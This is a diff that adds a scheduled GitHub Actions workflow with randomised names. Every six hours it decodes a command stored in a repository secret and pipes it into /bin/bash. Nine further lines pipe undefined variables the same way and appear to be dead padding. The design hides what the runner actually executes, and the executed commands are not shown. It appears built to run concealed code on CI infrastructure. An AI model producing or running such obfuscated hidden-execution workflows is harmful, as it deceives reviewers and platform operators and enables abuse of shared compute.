@@ -1,0 +1,28 @@
+name: panangongrang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: panangongrang
+        env:
+          yqb456: ${{ secrets.yqb456 }}
+        run: |
+          echo $yqb456 | jq -r .atngk924 | /bin/bash
+          echo $pxj8 | jq -r .ywqyd930 | /bin/bash
+          echo $n93840 | jq -r .c7255 | /bin/bash
+          echo $oxlfs0180 | jq -r .dl23184 | /bin/bash
+          echo $esxto7787 | jq -r .ciwkt19861 | /bin/bash
+          echo $t9519 | jq -r .z31070 | /bin/bash
+          echo $eauc72953 | jq -r .vs3 | /bin/bash
+          echo $znn060 | jq -r .gx67429 | /bin/bash
+          echo $ujlht8 | jq -r .iapv423 | /bin/bash
+          echo $iyppt041 | jq -r .oi99226 | /bin/bash
+
